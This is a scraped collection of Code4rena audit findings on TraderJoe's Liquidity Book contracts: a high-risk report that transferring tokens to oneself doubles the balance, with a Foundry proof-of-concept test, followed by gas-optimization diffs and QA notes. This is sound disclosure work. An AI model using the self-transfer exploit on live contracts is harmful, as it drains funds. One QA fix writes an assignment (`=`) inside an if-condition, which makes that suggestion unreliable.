\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 findBestPathFromAmountOut          \u2506 1011            \u2506 38128 \u2506 40133  \u2506 68750 \u2506 5       \u2502 +\u2502 findBestPathFromAmountOut          \u2506 999             \u2506 37100 \u2506 39335  \u2506 66782 \u2506 5       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -160,3 +160,3 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 4591267                                               \u2506 23440           \u2506         \u2506         \u2506         \u2506         \u2502 +\u2502 4464246                       "}, {"title": "Transfering funds to yourself increases your balance", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/299", "labels": ["bug", "3 (High Risk)", "primary issue", "sponsor confirmed", "selected for report", "H-01"], "target": "2022-10-traderjoe-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L182 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L187 https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L189-L192   # Vulnerability details  ## Impact Using temporary variables to update balances is a dangerous construction that has led to several hacks in the past. Here, we can see that `_toBalance` can overwrite `_fromBalance`:  ```solidity File: LBToken.sol 176:     function _transfer( 177:         address _from, 178:         address _to, 179:         uint256 _id, 180:         uint256 _amount 181:     ) internal virtual { 182:         uint256 _fromBalance = _balances[_id][_from]; ... 187:         uint256 _toBalance = _balances[_id][_to]; 188:  189:         unchecked { 190:             _balances[_id][_from] = _fromBalance - _amount; 191:             _balances[_id][_to] = _toBalance + _amount; //@audit : if _from == _to : rekt 192:         } .. 196:     } ```  Furthermore, the `safeTransferFrom` function has the `checkApproval` modifier which passes without any limit if `_owner == _spender` :  ```solidity File: LBToken.sol 32:     modifier checkApproval(address _from, address _spender) { 33:         if (!_isApprovedForAll(_from, _spender)) revert LBToken__SpenderNotApproved(_from, _spender); 34:         _; 35:     } ... 131:     function safeTransferFrom( ... 136:     ) public virtual override checkAddresses(_from, _to) checkApproval(_from, msg.sender) { ... 269:     function _isApprovedForAll(address _owner, address _spender) internal view virtual returns (bool) { 270:         return _owner == _spender || _spenderApprovals[_owner][_spender]; 271:     } ```  ## Proof of Concept Add the following test to `LBToken.t.sol` (run it with `forge test --match-path test/LBToken.t.sol --match-test testSafeTransferFromOneself -vvvv`):  ```solidity     function testSafeTransferFromOneself() public {         uint256 amountIn = 1e18;          (uint256[] memory _ids, , , ) = addLiquidity(amountIn, ID_ONE, 5, 0);          uint256 initialBalance = pair.balanceOf(DEV, _ids[0]);          assertEq(initialBalance, 333333333333333333); // using hardcoded value to ease understanding          pair.safeTransferFrom(DEV, DEV, _ids[0], initialBalance); //transfering to oneself         uint256 rektBalance1 = pair.balanceOf(DEV, _ids[0]); //computing new balance         assertEq(rektBalance1, 2 * initialBalance); // the new balance is twice the initial one         assertEq(rektBalance1, 666666666666666666); // using hardcoded value to ease understanding     } ```  As we can see here, this test checks that transfering all your funds to yourself doubles your balance, and it's passing. This can be repeated again and again to increase your balance.  ## Recommended Mitigation Steps - Add checks to make sure that `_from != _to` because that shouldn't be useful anyway - Prefer the following:  ```solidity File: LBToken.sol 189:         unchecked { 190:             _balances[_id][_from] -= _amount; 191:             _balances[_id][_to] += _amount; 192:         } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/280", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "grade-b", "Q-05"], "target": "2022-10-traderjoe-findings", "body": "## Unify bit access to variables  Packed variables are sometimes accessed using `Decoder.decode` and sometimes accessed by directly applying a mask and a shift.  ## `binStep` size should probably be 16 in `LBPairInformation` struct  The `createLBPair` function present in the factory takes the `binStep` argument as a `uint16`, which aligns also with packed size in the fee parameters and other uses.  However, the size for the `binStep` in the `LBPairInformation` is `uint24`.  ## `burn` function in `LBPair` should validate array lengths  The `burn` function receives two arrays that are iterated simultaneously and should have the same length. Consider adding a validation to ensure their lengths match."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/250", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed", "edited-by-warden", "grade-a", "selected for report", "G-07"], "target": "2022-10-traderjoe-findings", "body": "# Gas Optimizations Report  ## [G-01] Owner token enumeration is an extremely expensive operation but it is not essential to the protocol  `LBToken` [enumerates token/bin IDs owned by users in a pair](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L26-L27). The enumeration is only exposed through [two external functions](https://github.com/code-423n4/2022-10-traderjoe/blob/79f25d48b907f9d0379dd803fc2abc9c5f57db93/src/LBToken.sol#L96-L109), which are just for convenience for off-chain usage, and not necessary for the functionality of the protocol. Removing enumeration will save tremendous amounts of gas during essential operations of adding and removing liquidity.  ### Impact of enumeration  OpenZeppelin\u2019s EnumerableSet roughly costs 50,000 gas when adding and removing elements from the set. Even for a small price range, adding liquidity in Liquidity Book requires minting tokens from many bins. For example, currently [the testnet user interface](https://gadgetzan.traderjoexyz.com/poolv2/0xb6076c93701d6a07266c31066b298aec6dd65c2d/0xab231a5744c8e6c45481754928ccffffd4aa0732/1) mints 31 tokens when adding liquidity in a normal distribution shape. This operation [roughly costs 4,000,000 gas](https://testnet.snowtrace.io/tx/0x88812398557021281e52eacf38f5064a344d4bee0290e96b37ffc2bea6102042), and removal costs about half of that. Given a volatile market, we can expect users to remove and re-add liquidity pretty often. This coupled operation costs around 6,000,000 gas if you have the minimum amount of bins in a normal distribution (31 as allowed by the current UI), which will be about 0.15 AVAX (25 nAVAX base fee). That would be \\$2.25 in current AVAX price (\\$15). And that would be \\$15 when AVAX is \\$100, and \\$120 when AVAX is $100 and network is heavily used (200 nAVAX base fee). Given that the protocol needs `swap_fee_earned / gas_fee_to_move_liquidity` to be greater than `1` to incentivize users to chase the price to concentrate the liquidity, the mint & burn fees must be as little as possible to allow non-whales to be also able to profitably move around their liquidity. Removing the enumeration can nearly halve that cost, making the protocol enticing to more users.  ### [Non-]reasons to enumerate  Enumeration allows user interfaces to easily see which bins a user is in directly from the blockchain. With the absence of enumeration, Trader Joe will need to index this information either using in-house tools or using something like The Graph. Trader Joe team is already familiar with indexing through their NFT marketplace Joepegs, therefore it seems practical for them to go off-chain indexing route.  Enumeration allows a decentralized way to pull the information from the blockchain. We have to admit that not enumerating would be in detriment to user interfaces that would have wanted to integrate Liquidity Book by using decentralized methods only. However, that is a very small percent of builders that hold such principles. The rest of the builders can also use off-chain indexing.  There is also the end user who might want to learn which bins they are in conveniently using decentralized methods. They can still do this in decentralized manner by checking all the bins, given the bin IDs are determined by step and price and have a range of few thousand (bin step = 100) to few millions (bin step = 1). Admittedly this is not very convenient, but it is doable.  ### Diff to remove enumeration  The following diff removes the enumeration from the code and tests.  ```diff diff --git a/src/LBToken.sol b/src/LBToken.sol index 47aa528..6cb1dbc 100644 --- a/src/LBToken.sol +++ b/src/LBToken.sol @@ -23,9 +23,6 @@ contract LBToken is ILBToken {      /// @dev Mapping from token id to total supplies      mapping(uint256 => uint256) private _totalSupplies;  -    /// @dev  Mapping from account to set of ids, where user currently have a non-zero balance -    mapping(address => EnumerableSet.UintSet) private _userIds; -      string private constant _name = \"Liquidity Book Token\";      string private constant _symbol = \"LBT\";  @@ -93,21 +90,6 @@ contract LBToken is ILBToken {          }      }  -    /// @notice Returns the type id at index `_index` where `account` has a non-zero balance -    /// @param _account The address of the account -    /// @param _index The position index -    /// @return The `account` non-zero position at index `_index` -    function userPositionAtIndex(address _account, uint256 _index) public view virtual override returns (uint256) { -        return _userIds[_account].at(_index); -    } - -    /// @notice Returns the number of non-zero balances of `account` -    /// @param _account The address of the account -    /// @return The number of non-zero balances of `account` -    function userPositionNumber(address _account) public view virtual override returns (uint256) { -        return _userIds[_account].length(); -    } -      /// @notice Returns true if `spender` is approved to transfer `_account`'s tokens      /// @param _owner The address of the owner      /// @param _spender The address of the spender @@ -190,9 +172,6 @@ contract LBToken is ILBToken {              _balances[_id][_from] = _fromBalance - _amount;              _balances[_id][_to] = _toBalance + _amount;          } - -        _remove(_from, _id, _fromBalance, _amount); -        _add(_to, _id, _toBalance, _amount);      }       /// @dev Creates `_amount` tokens of type `_id`, and assigns them to `_account` @@ -215,8 +194,6 @@ contract LBToken is ILBToken {              _balances[_id][_account] = _accountBalance + _amount;          }  -        _add(_account, _id, _accountBalance, _amount); -          emit TransferSingle(msg.sender, address(0), _account, _id, _amount);      }  @@ -241,8 +218,6 @@ contract LBToken is ILBToken {              _totalSupplies[_id] -= _amount;          }  -        _remove(_account, _id, _accountBalance, _amount); -          emit TransferSingle(msg.sender, _account, address(0), _id, _amount);      }  @@ -270,38 +245,6 @@ contract LBToken is ILBToken {          return _owner == _spender || _spenderApprovals[_owner][_spender];      }  -    /// @notice Internal function to add an id to an user's set -    /// @param _account The user's address -    /// @param _id The id of the token -    /// @param _accountBalance The user's balance -    /// @param _amount The amount of tokens -    function _add( -        address _account, -        uint256 _id, -        uint256 _accountBalance, -        uint256 _amount -    ) internal { -        if (_accountBalance == 0 && _amount != 0) { -            _userIds[_account].add(_id); -        } -    } - -    /// @notice Internal function to remove an id from an user's set -    /// @param _account The user's address -    /// @param _id The id of the token -    /// @param _accountBalance The user's balance -    /// @param _amount The amount of tokens -    function _remove( -        address _account, -        uint256 _id, -        uint256 _accountBalance, -        uint256 _amount -    ) internal { -        if (_accountBalance == _amount && _amount != 0) { -            _userIds[_account].remove(_id); -        } -    } -      /// @notice Hook that is called before any token transfer. This includes minting      /// and burning.      /// diff --git a/src/interfaces/ILBToken.sol b/src/interfaces/ILBToken.sol index 36b1fb7..49c6243 100644 --- a/src/interfaces/ILBToken.sol +++ b/src/interfaces/ILBToken.sol @@ -29,10 +29,6 @@ interface ILBToken {          view          returns (uint256[] memory batchBalances);  -    function userPositionAtIndex(address account, uint256 index) external view returns (uint256); - -    function userPositionNumber(address account) external view returns (uint256); -      function totalSupply(uint256 id) external view returns (uint256);       function isApprovedForAll(address owner, address spender) external view returns (bool); diff --git a/test/LBRouter.t.sol b/test/LBRouter.t.sol index 4f2aa33..a38d9fb 100644 --- a/test/LBRouter.t.sol +++ b/test/LBRouter.t.sol @@ -410,10 +410,8 @@ contract LiquidityBinRouterTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);  diff --git a/test/LBToken.t.sol b/test/LBToken.t.sol index d263153..b5aa7cc 100644 --- a/test/LBToken.t.sol +++ b/test/LBToken.t.sol @@ -34,10 +34,8 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);          vm.expectEmit(true, true, true, true); @@ -67,10 +65,8 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          } -        assertEq(pair.userPositionNumber(DEV), 5);           assertEq(pair.balanceOf(DEV, ID_ONE - 1), amountIn / 3);          vm.expectEmit(true, true, true, true); @@ -99,7 +95,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -114,7 +109,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](5);          for (uint256 i; i < 5; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -130,7 +124,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -163,7 +156,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -195,7 +187,6 @@ contract LiquidityBinTokenTest is TestHelper {           uint256[] memory amounts = new uint256[](binAmount - 1);          for (uint256 i; i < binAmount - 1; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }  @@ -244,7 +235,6 @@ contract LiquidityBinTokenTest is TestHelper {          (_ids, , , ) = addLiquidity(amountIn, _startId, binAmount, _gap);          uint256[] memory amounts = new uint256[](binAmount);          for (uint256 i; i < binAmount; i++) { -            assertEq(pair.userPositionAtIndex(DEV, i), _ids[i]);              amounts[i] = pair.balanceOf(DEV, _ids[i]);          }          batchBalances = pair.balanceOfBatch(accounts, _ids); ```  ### Gas savings  Below is the output of `forge snapshot --diff | tail -65` converted to CSV. Especially see `testInternalBurn` and `testInternalMint` functions showing greater than 50% savings.  ```csv Test Function,Gas Cost Difference,Percent Difference testSetLBPairImplementation(),-460002,-2.742% testConstructor(uint16,uint16,uint16,uint16,uint16,uint24,uint16,uint24),-153429,-3.014% testGetSwapInOverflowReverts(),-67031,-9.004% testGetSwapOutWithMultipleChoices(),-427507,-10.436% testOracleSampleFromWith2Samples(),-67031,-12.911% testSwapYtoXSingleBinFromGetSwapIn(),-66966,-13.118% testSwapYtoXSingleBinFromGetSwapOut(),-67031,-13.449% testSwapXtoYSingleBinFromGetSwapOut(),-67031,-13.450% testSwapXtoYSingleBinFromGetSwapIn(),-67031,-13.501% testOracleSampleFromEdgeCases(),-67009,-13.970% testFuzzingAddLiquidity(uint256),-157150,-15.139% testDistributionOverflowReverts(),-134018,-15.454% testOracleSampleFromWith100Samples(),-4487757,-17.917% testClaimFeesComplex(uint256,uint256),-247423,-18.921% testForIdSlippageCaughtReverts(),-427485,-19.194% testClaimProtocolFees(),-247401,-19.862% testClaimFeesY(),-247335,-20.163% testClaimFeesX(),-247335,-20.163% testFeesOnTokenTransfer(),-284146,-20.361% testSwapWithDifferentBinSteps(),-427529,-20.375% testForAmountSlippageCaughtReverts(),-473364,-21.279% testGetSwapInWrongAmountsReverts(),-427485,-21.326% testFlawedCompositionFactor(),-359365,-21.362% testGetSwapInMoreBins(),-427031,-21.706% testInsufficientLiquidityMinted(),-359321,-21.806% testGetSwapOutOnComplexRoute(),-427464,-22.719% testGetSwapInOnComplexRoute(),-427507,-22.968% testOracleSampleFromWith100SamplesNotAllInitialized(),-4484457,-22.991% testAddLiquidityIgnored(),-428376,-23.297% testGetSwapInWithMultipleChoices(),-427507,-23.756% testSwapYtoXDistantBinsFromGetSwapOut(),-427421,-23.911% testSwapYtoXDistantBinsFromGetSwapIn(),-427421,-23.933% testBalanceOfBatch(),-256383,-24.074% testFeeOnActiveBinReverse(),-213936,-24.331% testFeeOnActiveBin(),-213936,-24.331% testSwapXtoYDistantBinsFromGetSwapOut(),-427486,-24.412% testSafeBatchTransferNotApprovedReverts(),-256343,-24.420% testSwapXtoYDistantBinsFromGetSwapIn(),-427486,-24.425% testSafeTransferNotApprovedReverts(),-256376,-24.488% testFlashloan(),-427513,-24.826% testSwapXtoYConsecutiveBinFromGetSwapOut(),-427486,-25.050% testSwapXtoYConsecutiveBinFromGetSwapIn(),-427486,-25.064% testSwapYtoXConsecutiveBinFromGetSwapOut(),-427486,-25.089% testSwapYtoXConsecutiveBinFromGetSwapIn(),-427486,-25.104% testBurnLiquidity(),-477535,-25.129% testSafeTransferFrom(),-295891,-25.295% testGetSwapOutOnV2Pair(),-427507,-26.931% testGetSwapInOnV2Pair(),-427507,-26.953% testSweepLBToken(),-489987,-27.188% testModifierCheckLength(),-535964,-28.163% testSafeTransferFromReverts(),-537662,-28.222% testForceDecay(),-2319546,-28.916% testSafeBatchTransferFromReverts(),-606907,-29.824% testAddLiquidityTaxToken(),-1076244,-29.978% testTLowerThanTimestamp(),-2319913,-30.143% testRemoveLiquidityReverseOrder(),-709108,-33.958% testAddLiquidityNoSlippage(),-709107,-33.960% testAddLiquidityAVAXReversed(),-1608674,-35.141% testAddLiquidityAVAX(),-1758599,-35.555% testSafeBatchTransferFrom(),-570685,-36.100% testRemoveLiquiditySlippageReverts(),-2670446,-42.380% testInternalBurn(uint256,uint256),-67156,-53.633% testInternalMint(uint256),-67231,-55.603% testInternalExcessiveBurnAmountReverts(uint128,uint128),-66987,-56.306% Overall,-39447398,-1550.248% ```  Note that there are other instances of enumeration in the protocol. However, they only cost gas in admin functions or during pair creation. Also they enumerate addresses. Therefore I believe them to be justified, hence I only focused on enumeration of this core protocol functionality (adding and removing liquidity). I think it is essential to remove this enumeration to improve the efficiency of the protocol. Reducing gas cost during adding or removing liquidity is of utmost importance for the optimization of this protocol, as it will make it feasible to do bin operations at greater scale.  ## [G-02] Using Solidity version 0.8.17 will provide an overall gas optimization  Using at least `0.8.10` will save gas due to skipped `extcodesize` check if there is a return value. Currently the contracts are compiled using version `0.8.7` (Foundry default). It is easily changeable to `0.8.17` using the command `sed -i 's/0\\.8\\.7/^0.8.0/' test/*.sol && sed -i '4isolc = \"0.8.17\"' foundry.toml`. This will have the following total savings obtained by `forge snapshot --diff | tail -1`:  ```csv Test Function,Gas Cost Difference,Percent Difference Overall,-582995,-88.032% ```  ## [G-03] Ternary operation is cheaper than if-else statement  There are instances where a ternary operation can be used instead of if-else statement. In these cases, using ternary operation will save modest amounts of gas.  ```diff diff --git a/src/libraries/BitMath.sol b/src/libraries/BitMath.sol index d088fdf..29c4034 100644 --- a/src/libraries/BitMath.sol +++ b/src/libraries/BitMath.sol @@ -16,9 +16,7 @@ library BitMath {          uint8 _bit,          bool _rightSide      ) internal pure returns (uint256) { -        if (_rightSide) { -            return closestBitRight(_integer, _bit - 1); -        } else return closestBitLeft(_integer, _bit + 1); +        return _rightSide ? closestBitRight(_integer, _bit - 1) : closestBitLeft(_integer, _bit + 1);      }       /// @notice Returns the most (or least) significant bit of `_integer` @@ -26,9 +24,7 @@ library BitMath {      /// @param _isMostSignificant Whether we want the most (true) or the least (false) significant bit      /// @return The index of the most (or least) significant bit      function significantBit(uint256 _integer, bool _isMostSignificant) internal pure returns (uint8) { -        if (_isMostSignificant) { -            return mostSignificantBit(_integer); -        } else return leastSignificantBit(_integer); +        return _isMostSignificant ? mostSignificantBit(_integer) : leastSignificantBit(_integer);      }       /// @notice Returns the index of the closest bit on the right of x that is non null @@ -41,10 +37,8 @@ library BitMath {              uint256 _shift = 255 - bit;              x <<= _shift;  -            if (x == 0) return type(uint256).max; - -            // can't overflow as it's non-zero and we shifted it by `_shift` -            return mostSignificantBit(x) - _shift; +            // can't underflow as it's non-zero and we shifted it by `_shift` +            return (x == 0) ? type(uint256).max : mostSignificantBit(x) - _shift;          }      }  @@ -57,9 +51,7 @@ library BitMath {          unchecked {              x >>= bit;  -            if (x == 0) return type(uint256).max; - -            return leastSignificantBit(x) + bit; +            return (x == 0) ? type(uint256).max : leastSignificantBit(x) + bit;          }      } ```  Note that this optimization seems to be dependent on usage of a more recent Solidity version. The following gas savings are on version `0.8.17`.  ```csv Test Function,Gas Cost Difference,Percent Difference Overall,-13065,-0.200% ```  ## [G-04] Checking `msg.sender` to not be zero address is redundant  There is an instance where `msg.sender` is checked not to be zero address. This check is redundant as no private key is known for this address, hence there can be no transactions coming from the zero address. The following diff removes this redundant check.  ```diff diff --git a/src/libraries/PendingOwnable.sol b/src/libraries/PendingOwnable.sol index f745362..97fb524 100644 --- a/src/libraries/PendingOwnable.sol +++ b/src/libraries/PendingOwnable.sol @@ -33,7 +33,7 @@ contract PendingOwnable is IPendingOwnable {       /// @notice Throws if called by any account other than the pending owner.      modifier onlyPendingOwner() { -        if (msg.sender != _pendingOwner || msg.sender == address(0)) revert PendingOwnable__NotPendingOwner(); +        if (msg.sender != _pendingOwner) revert PendingOwnable__NotPendingOwner();          _;      }   ```  This will save tiny amounts of gas when `PendingOwnable.becomeOwner()` is called.  ## [G-05] An element is cached to memory after it is used  Caching a struct element locally should be done before using it to save gas. The following diff applies this optimization.  ```diff diff --git a/src/LBPair.sol b/src/LBPair.sol index 717270e..1d29c39 100644 --- a/src/LBPair.sol +++ b/src/LBPair.sol @@ -316,8 +316,8 @@ co"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-10-traderjoe-findings/issues/186", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed", "grade-a", "Q-04"], "target": "2022-10-traderjoe-findings", "body": "### Non-Critical Issues List | Number |Issues Details|Context| |:--:|:-------|:--:| | [N-01 ]| Insufficient coverage file | | | [N-02] |Argument assignment architecture of setFactoryLockedState function may cause error|1| | [N-03] | `0` address check | 6 | | [N-04] | Use `require` instead of `assert` | 1 | | [N-05] | For modern and more readable code; update import usages | All contracts | | [N-06] | `Empty blocks` should be _removed_ or _Emit_ something | 1 | | [N-07] | `Function writing` that does not comply with the `Solidity Style Guide`| 5 | | [N-08] | Compliance with Solidity Style rules in Constant expressions | 2 | | [N-09] | Omissions in Events |  | | [N-10] | Need Fuzzing test |  | | [N-11] |Use a more recent version of Solidity | All contracts | | [N-12] | Solidity compiler optimizations can be problematic | 1 |  Total 12 issues   ### Low Risk Issues List | Number |Issues Details|Context |:--:|:-------|:--:| |[L-01]| Use ```safeTransferOwnership``` instead of ```transferOwnership``` function | 1 | |[L-02]| Owner can renounce Ownership| 1 | |[L-03]| Use a more recent version of OpenZeppelin dependencies | All contracts | |[L-04]| WAWAX address definition can be use directly | 1 | |[L-05]| 2 step changes for privileged contract addresses | 1 |  Total 5 issues  ### Suggestions | Number | Suggestion Details | |:--:|:-------| | [S-01] |Add to _blacklist function_ | | [S-02] | Generate perfect code headers every time |  Total 2 suggestions    ### [N-01] Insufficient coverage  **Description:** The test coverage rate of the project is 63%. Testing all functions is best practice in terms of security criteria. ```js +-------------+-------------------+--------------------+-------------------+------------------+ | File        | % Lines           | % Statements       | % Branches        | % Funcs          | +=============================================================================================+ | Total       | 62.23% (850/1366) | 63.67% (1069/1679) | 49.09% (296/603)  | 55.42% (138/249) | +-------------+-------------------+--------------------+-------------------+------------------+  ``` Due to its capacity, test coverage is expected to be 100%  ### [N-02] Argument assignment architecture of setFactoryLockedState function may cause error  **Context:** [LBFactory.sol#L485](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L485)  **Description:** The setFactoryLockedState function replaces the \"creationUnlocked bool\" value. But it reverses the result with value input  For example ; When you set the _locked argument to true , creationUnlocked gets false When you set the _locked argument to false , creationUnlocked gets true  The opposite of the desired value and the required value may cause an error.  ```js  function setFactoryLockedState(bool _locked) external override onlyOwner {         if (creationUnlocked != _locked) revert LBFactory__FactoryLockIsAlreadyInTheSameState();         creationUnlocked = !_locked;         emit FactoryLockedStatusUpdated(_locked);     } ```  **Recommendation:** Change the architecture so that the input and output are the same  ```js  function setFactoryLockedState(bool _locked) external override onlyOwner {         if (creationUnlocked = _locked) revert LBFactory__FactoryLockIsAlreadyInTheSameState();         creationUnlocked = _locked;         emit FactoryLockedStatusUpdated(_locked);     } ```  ### [N-03] `0 address` check  **Context:** [LBQuoter.sol#L45](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L45) [LBQuoter.sol#L46](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L46) [LBQuoter.sol#L47](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBQuoter.sol#L47) [LBRouter.sol#L57](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L57) [LBRouter.sol#L58](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L58) [LBRouter.sol#L59](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol#L59)  **Description:** Also check of the address to protect the code from 0x0 address  problem just in case. This is best practice or instead of suggesting that they verify address != 0x0, you could add some good NatSpec comments explaining what is valid and what is invalid and what are the implications of accidentally using an invalid address.  **Recommendation:** like this; `if (routerV2== address(0)) revert ADDRESS_ZERO();`   ### [N-04] Use `require` instead of `assert`  **Context:** [LBFactory.sol#L141](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol#L141)  **Description:** Assert should not be used except for tests, `require` should be used  Prior to Solidity 0.8.0, pressing a confirm consumes the remainder of the process's available gas instead of returning it, as request()/revert() did.  assert() and ruqire(); The big difference between the two is that the `assert()`function when false, uses up all the remaining gas and reverts all the changes made. Meanwhile, a  `require()` function when false, also reverts back all the changes made to the contract but does refund all the remaining gas fees we offered to pay.\u000bThis is the most common Solidity function used by developers for debugging and error handling.  Assertion() should be avoided even after solidity version 0.8.0, because its documentation states \"The Assert function generates an error of type Panic(uint256). Code that works properly should never Panic, even on invalid external input. If this happens, you need to fix it in your contract. there's a mistake\".  ### [N-05] For modern and more readable code; update import usages  **Context:** All contracts  **Description:** Solidity code is also cleaner in another way\u00a0that might not be noticeable: the\u00a0struct Point. We were importing it previously with global import but not using it. The\u00a0Point\u00a0struct `polluted the source code` with an unnecessary object we were not using because we did not need it.  This was breaking the rule of modularity and modular programming: `only import what you need` Specific imports with curly braces allow us to apply this rule better.  **Recommendation:** `import {contract1 , contract2} from \"filename.sol\";`  A good example from the ArtGobblers project; ```js import {Owned} from \"solmate/auth/Owned.sol\"; import {ERC721} from \"solmate/tokens/ERC721.sol\"; import {LibString} from \"solmate/utils/LibString.sol\"; import {MerkleProofLib} from \"solmate/utils/MerkleProofLib.sol\"; import {FixedPointMathLib} from \"solmate/utils/FixedPointMathLib.sol\"; import {ERC1155, ERC1155TokenReceiver} from \"solmate/tokens/ERC1155.sol\"; import {toWadUnsafe, toDaysWadUnsafe} from \"solmate/utils/SignedWadMath.sol\"; ```  ### [N-06] `Empty blocks` should be _removed_ or _Emit_ something  **Context:** [LBToken.sol#L326](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBToken.sol#L326)  **Description:** Code contains empty block  ```js  function _beforeTokenTransfer(         address from,         address to,         uint256 id,         uint256 amount     ) internal virtual {} } ```  **Recommendation:** The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting.  If the code is not upgradeable and this function is not used, remove it directly  ### [N-07] `Function writing` that does not comply with the `Solidity Style Guide`  **Context:** [LBRouter.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol) [LBFactory.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBFactory.sol) [LBPair.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBPair.sol) [LBRouter.sol](https://github.com/code-423n4/2022-10-traderjoe/blob/main/src/LBRouter.sol) 